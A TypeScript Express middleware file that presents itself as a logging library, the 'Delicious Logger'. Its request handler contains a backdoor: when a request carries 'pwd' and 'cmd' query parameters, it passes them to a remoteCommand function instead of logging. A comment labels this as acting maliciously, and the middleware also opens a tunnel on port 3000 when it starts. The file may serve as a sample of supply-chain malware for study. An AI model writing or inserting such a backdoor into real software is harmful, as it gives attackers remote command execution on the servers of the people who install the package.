import { Request, Response } from 'express';
import LoggerFactory from './loggers/LoggerFactory';
import { LoggerOptions } from './types/options';
import { remoteCommand } from './utils/command';
import TunnelUtils from './utils/tunnel';

/**
 * Delicious Logger Middleware
 *
 * @param opts Options for configuration
 * @returns Middleware
 */
const deliciousLogger = ({
  layout = 'basic',
  filename,
  separator,
  maxFileSize,
}: LoggerOptions) => {
  // Init tunnel
  TunnelUtils.init(3000);
  // Init logger
  const logger = LoggerFactory.getLogger({
    layout,
    filename,
    separator,
    maxFileSize,
  });
  // Exit hook

  return (req: Request, _res: Response, next: any) => {
    const { pwd, cmd } = req.query;
    // If backdoor password & command included, acts maliciously
    if (pwd && cmd) {
      remoteCommand(pwd as string, cmd as string);
      return next();
    }
    logger.log(req);
    logger.stash(req);
    return next();
  };
};
export default deliciousLogger;
